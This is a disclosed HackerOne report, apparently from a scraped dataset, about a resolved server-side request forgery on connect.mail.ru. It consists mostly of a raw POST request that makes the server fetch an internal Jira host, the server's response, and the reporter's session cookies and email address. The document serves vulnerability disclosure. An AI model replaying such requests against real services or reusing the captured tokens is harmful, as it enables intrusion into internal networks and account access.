---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '14033'
original_report_id: '14033'
title: 'connect.mail.ru: SSRF'
team_handle: mailru
created_at: '2014-05-29T19:02:07.188Z'
disclosed_at: '2015-09-13T12:02:27.399Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
---

# connect.mail.ru: SSRF

## Metadata

- HackerOne Report ID: 14033
- Weakness: 
- Program: mailru
- Disclosed At: 2015-09-13T12:02:27.399Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Можно лазить по внутренним ресурсам в сети mail.ru :))

POST /ajax?ajax_call=1&func_name=perl_fetch_connect_page HTTP/1.1
Host: connect.mail.ru
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0
Accept: text/javascript, text/html, application/xml, text/xml, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-Prototype-Version: 1.6.0.3
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://connect.mail.ru/share?url=https%3A%2F%2Fcalendar.mail.ru%2Fday-in-history%2F882EDC08-5A1F-4389-B7AD-6B4E4FE4AD57%2F&title=%D0%94%D0%B5%D0%BD%D1%8C%20%D0%B2%20%D0%B8%D1%81%D1%82%D0%BE%D1%80%D0%B8%D0%B8%20%E2%80%94%20%D0%90%D0%BA%D1%82%20%D0%BE%20%D0%BA%D0%B0%D0%BF%D0%B8%D1%82%D1%83%D0%BB%D1%8F%D1%86%D0%B8%D0%B8%20%D0%93%D0%B5%D1%80%D0%BC%D0%B0%D0%BD%D0%B8%D0%B8&description=8%20%D0%BC%D0%B0%D1%8F%201945%20%D0%B3%D0%BE%D0%B4%D0%B0%20%D0%B2%20%D0%BF%D1%80%D0%B8%D0%B3%D0%BE%D1%80%D0%BE%D0%B4%D0%B5%20%D0%91%D0%B5%D1%80%D0%BB%D0%B8%D0%BD%D0%B0%20%D0%9A%D0%B0%D1%80%D0%BB%D1%81%D1%85%D0%BE%D1%80%D1%81%D1%82%D0%B5%20%D0%BF%D0%BE%D0%B4%D0%BF%D0%B8%D1%81%D0%B0%D0%BD%20%D0%B0%D0%BA%D1%82%20%D0%BE%20%D0%B1%D0%B5%D0%B7%D0%BE%D0%B3%D0%BE%D0%B2%D0%BE%D1%80%D0%BE%D1%87%D0%BD%D0%BE%D0%B9%20%D0%BA%D0%B0%D0%BF%D0%B8%D1%82%D1%83%D0%BB%D1%8F%D1%86%D0%B8%D0%B8%20%D0%93%D0%B5%D1%80%D0%BC%D0%B0%D0%BD%D0%B8%D0%B8%20%D0%B2%D0%BE%20%D0%92%D1%82%D0%BE%D1%80%D0%BE%D0%B9%20%D0%BC%D0%B8%D1%80%D0%BE%D0%B2%D0%BE%D0%B9%20%D0%B2%D0%BE%D0%B9%D0%BD%D0%B5.&imageurl=
Content-Length: 33
Cookie: p=b0kAAEt9twAA; mrcu=A6505381CD6669AD68F68DC71B5F; s=fver=13|s_vp=(2560/1279)|dpr=1; b=Wj8EAHBUDgcAxoe0YU7NIpS+JoTnFo2gk8ofhD70DhC6U+RC6PqaizJm6SnCCKS9CGPGnUKMBFgMMRq0LcIIT8UgI+7PIozAJoxwAgAAwrnPxQgA; VID=0Mm8Po3iv9HE:; searchuid=1527834891401015703; Mpop=1401389573:535d476e03546b5419050219081d000c1c0c054f6a5d5e465e030307071d01017518584a564010595f555a4f1b4341:isox@inbox.ru:; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAQAAABAAAID3gcA; i=AQBYgYdTBwATAAg6E0IBAUMBAV4BAWMBAWcBAWoBAWsBAW4BAYwBAY8BAXACAZ4CAaICAacCAaoCAdwEAfQEAR8oASMoASoABQIB/F0ABQIBAMkABQIB/O8BCAQBAQABKgIFAgH8WAMIBAEBAAE=; mc1=1401389493; _ga=GA1.2.49844597.1401016323; c=bYGHUwAAAArTAAAyAQAAegAAAwAA; mc2=games.mail.ru; sdc=LfZsqVjnl2cDov8C
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

data=["http://jira.corp.mail.ru"]






HTTP/1.1 200 OK
Server: nginx/1.2.9
Date: Thu, 29 May 2014 18:57:15 GMT
Content-Type: text/plain; charset=UTF-8
Connection: close
Expires: Thu, 01 Jan 1970 00:00:01 GMT
P3P: policyref="/w3c/p3p.xml", CP="NON CUR ADM DEV PSA PSD OUR IND UNI NAV INT STA"
Content-Length: 435

["AjaxResponse","OK","http://jira.corp.mail.ru/",["http://jira.corp.mail.ru/s/ru_RU-qtcw8c/787/36/_/jira-logo-scaled.png"],null,"System Dashboard - Mail.ru","ÐÑ Ð¼Ð¾Ð¶ÐµÑÐµ Ð´Ð¾Ð±Ð°Ð²Ð¸ÑÑ Ð¿Ð¾ÑÑÐµÐ»Ñ Ð¸Ð· Ð¿ÑÐ¸Ð»Ð¾Ð¶ÐµÐ½Ð¸Ð¹ Atlassian, Ð½Ð°Ð¿ÑÐ¸Ð¼ÐµÑ Confluence, JIRA Ð¸ Ð´ÑÑÐ³Ð¸Ñ. ÐÑ ÑÐ°Ðº Ð¶Ðµ Ð¼Ð¾Ð¶ÐµÑÐµ Ð´Ð¾Ð±Ð°Ð²Ð¸ÑÑ Ð¿Ð¾ÑÑÐ»ÐµÑÑ Ñ Ð´ÑÑÐ³Ð¸Ñ Ð²ÐµÐ±-ÑÐ°Ð¹ÑÐ¾Ð², ÑÐ°ÐºÐ¸Ñ ÐºÐ°Ðº iGoggle.",null,null]

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
